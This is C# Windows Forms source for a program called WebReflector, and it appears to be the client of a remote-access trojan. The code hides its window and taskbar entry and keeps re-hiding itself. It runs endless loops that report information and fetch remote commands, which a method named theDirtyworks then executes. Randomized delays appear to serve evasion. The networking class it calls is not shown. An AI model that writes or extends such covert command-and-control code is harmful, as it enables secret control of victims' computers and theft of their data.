using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace WebReflector
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //this.WindowState = FormWindowState.Minimized;
            this.Hide();
            this.ShowInTaskbar = false;
            WebReflect.sendInfo();
            Thread reportthread = new Thread(report);
            reportthread.Start();
            Thread fetchthread = new Thread(fetchcmd);
            fetchthread.Start();
        }

        public static void report()
        {
            while (true)
            {
                Random ran = new Random();
                int RandKey = ran.Next(100, 999);
                Thread.Sleep(1000 + RandKey);
                WebReflect.sendInfo();
            }
        }

        public static void fetchcmd()
        {
            Thread.Sleep(500);
            while (true)
            {
                Random ran = new Random();
                int RandKey = ran.Next(100, 999);
                Thread.Sleep(1000 + RandKey);
                WebReflect.theDirtyworks(WebReflect.getCMD());
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (WebReflect.sendInfo())
            {
                MessageBox.Show("Succeed!");
            }
            else
            {
                MessageBox.Show("Failed");
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            MessageBox.Show(WebReflect.getCMD());
        }
        private void Form1_Activated(object sender, EventArgs e)
        {
            this.Hide();
        }
    }
}
